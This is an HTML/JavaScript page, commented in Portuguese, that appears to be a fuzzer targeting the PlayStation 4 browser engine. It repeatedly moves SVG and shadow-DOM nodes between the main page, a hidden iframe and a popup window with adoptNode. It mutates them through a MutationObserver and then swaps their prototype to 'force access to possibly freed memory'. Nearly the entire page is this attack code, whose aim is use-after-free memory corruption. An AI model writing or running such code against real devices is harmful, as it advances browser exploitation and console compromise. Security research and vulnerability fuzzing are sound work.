<!DOCTYPE html>
<html>
<head>
    <title>PS4 Nuclear Titan (Cross-Window + Proto Confusion)</title>
    <style>
        body { background: #050505; color: #ff00ff; font-family: monospace; overflow: hidden; margin: 0; }
        
        #hud { 
            position: fixed; top: 0; left: 0; width: 100%; 
            background: rgba(10, 0, 10, 0.95); 
            border-bottom: 3px solid #f0f; 
            padding: 15px; z-index: 9999;
            font-size: 20px; text-shadow: 0 0 5px #f0f;
        }

        .chaos { position: absolute; border: 1px dotted #555; }
    </style>
</head>
<body>
    <div id="hud">
        <div style="display: flex; justify-content: space-between;">
            <span>NUCLEAR TITAN: <span style="color:white">ATIVO</span></span>
            <span id="heartbeat" style="font-size: 24px;">☢</span>
        </div>
        <div style="margin-top: 5px; font-size: 16px; color: #aaa;">
            SEED: <span id="seed-disp" style="color:white; font-weight:bold;">...</span> | 
            NODES: <span id="nodes-count">0</span> | 
            JANELA POPUP: <span id="popup-status">OFF</span>
        </div>
    </div>

    <iframe id="victim-frame" style="width:1px; height:1px; opacity:0; position:absolute;"></iframe>
    
    <div id="arena" style="margin-top: 100px;"></div>

    <script>
        // ================= CONFIGURAÇÃO NUCLEAR =================
        const MAX_NODES = 1000; // Aumentado conforme solicitado (800-1200)
        // ========================================================

        let currentSeed = parseInt(localStorage.getItem('nuke_seed') || Math.floor(Math.random() * 100000));
        localStorage.setItem('nuke_last_start', currentSeed);

        function seed(s) { currentSeed = s; }
        function rnd() {
            var t = currentSeed += 0x6D2B79F5;
            t = Math.imul(t ^ t >>> 15, t | 1);
            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
            return ((t ^ t >>> 14) >>> 0) / 4294967296;
        }
        function coinflip() { return rnd() > 0.5; }

        // UI Elements
        const seedSpan = document.getElementById('seed-disp');
        const nodesSpan = document.getElementById('nodes-count');
        const beatSpan = document.getElementById('heartbeat');
        const popupStatus = document.getElementById('popup-status');
        const arena = document.getElementById('arena');
        const frame = document.getElementById('victim-frame');

        let liveNodes = [];
        let cycleCount = 0;
        let popupWindow = null;

        // --- GESTÃO DE JANELA POPUP (Vetor Cross-Window) ---
        function managePopup() {
            // Abre um popup a cada ~50 ciclos e fecha depois
            if (cycleCount % 50 === 0) {
                if (popupWindow) {
                    popupWindow.close();
                    popupWindow = null;
                    popupStatus.innerText = "OFF";
                    popupStatus.style.color = "#aaa";
                } else {
                    // Cria popup limpo para adoptNode entre janelas
                    popupWindow = window.open('about:blank', 'fuzz_pop', 'width=10,height=10');
                    if (popupWindow) {
                        popupStatus.innerText = "ON (TARGET)";
                        popupStatus.style.color = "#0f0";
                    }
                }
            }
        }

        // 1. CRIAÇÃO (Estruturas Complexas)
        function createComplexNode() {
            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            let foreign = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
            let div = document.createElement("div");
            
            div.className = "chaos";
            
            if (div.attachShadow && coinflip()) {
                try {
                    let sh = div.attachShadow({mode: coinflip() ? 'open' : 'closed'});
                    sh.innerHTML = "<slot></slot><span>SHADOW</span>";
                } catch(e){}
            }

            foreign.appendChild(div);
            svg.appendChild(foreign);
            return svg;
        }

        // 2. ATAQUE PRINCIPAL (Cross-Doc + Proto Confusion)
        function triggerCrossDoc(el) {
            try {
                // Decide se usa o iframe ou o popup (se disponível)
                let targetWin = (popupWindow && !popupWindow.closed) ? popupWindow : frame.contentWindow;
                if (!targetWin) return;
                let otherDoc = targetWin.document;

                let obs = new MutationObserver((mutations) => {
                    let t = mutations[0].target;
                    t.textContent = "DEAD"; 
                    if (t.parentNode) t.parentNode.removeChild(t);
                });
                obs.observe(el, { attributes: true, childList: true, subtree: true });

                // AÇÃO CRÍTICA: Mover para outro documento
                otherDoc.adoptNode(el);
                otherDoc.body.appendChild(el);

                // === GOLPE DE MISERICÓRDIA (Solicitado) ===
                // Isso confunde o layout interno do JSObject (Butterfly)
                // e força o acesso a memória possivelmente liberada
                try {
                    el.__proto__ = {}; 
                    let _ = el.getAttribute('style'); // Força deref
                } catch(e) {}
                // ==========================================

                // Traz de volta
                document.adoptNode(el);
                arena.appendChild(el);
                
                obs.disconnect();
            } catch(e) {}
        }

        function thrashLayout(el) {
            try {
                let _ = el.getBoundingClientRect().top;
                el.style.width = (rnd() * 100) + "%"; 
                _ = el.offsetHeight;
            } catch(e){}
        }

        async function loop() {
            while(true) {
                cycleCount++;
                seedSpan.innerText = currentSeed;
                nodesSpan.innerText = liveNodes.length;
                beatSpan.style.opacity = (beatSpan.style.opacity == "1") ? "0.2" : "1";

                // Gerencia ciclo de vida do Popup
                managePopup();

                if (cycleCount % 50 === 0) localStorage.setItem('nuke_seed', currentSeed);

                await new Promise(r => setTimeout(r, 20)); // Render pause

                for(let k=0; k < 25; k++) { // Mais agressivo por frame
                    seed(currentSeed);

                    // NASCIMENTO
                    if (liveNodes.length < MAX_NODES) {
                        let el = createComplexNode();
                        arena.appendChild(el);
                        liveNodes.push(el);
                    }

                    // TORTURA
                    let victim = liveNodes[Math.floor(rnd() * liveNodes.length)];
                    if (victim) {
                        if (coinflip()) triggerCrossDoc(victim);
                        thrashLayout(victim);
                    }

                    // MORTE
                    if (liveNodes.length > MAX_NODES * 0.85) {
                        let idx = Math.floor(rnd() * liveNodes.length);
                        let dying = liveNodes[idx];
                        liveNodes.splice(idx, 1);
                        
                        if (coinflip()) {
                            setTimeout(() => { try{ dying.remove(); }catch(e){} }, 0);
                        } else {
                            try{ dying.remove(); }catch(e){}
                        }
                    }
                    rnd(); 
                }
                
                currentSeed++;

                // Limpeza Ocasional
                if (cycleCount % 300 === 0) {
                    let junk = new ArrayBuffer(1024 * 1024);
                    junk = null;
                }
            }
        }

        window.onerror = function() { return true; };

        document.getElementById('seed-disp').innerText = "INICIANDO...";
        setTimeout(loop, 500);

    </script>
</body>
</html>
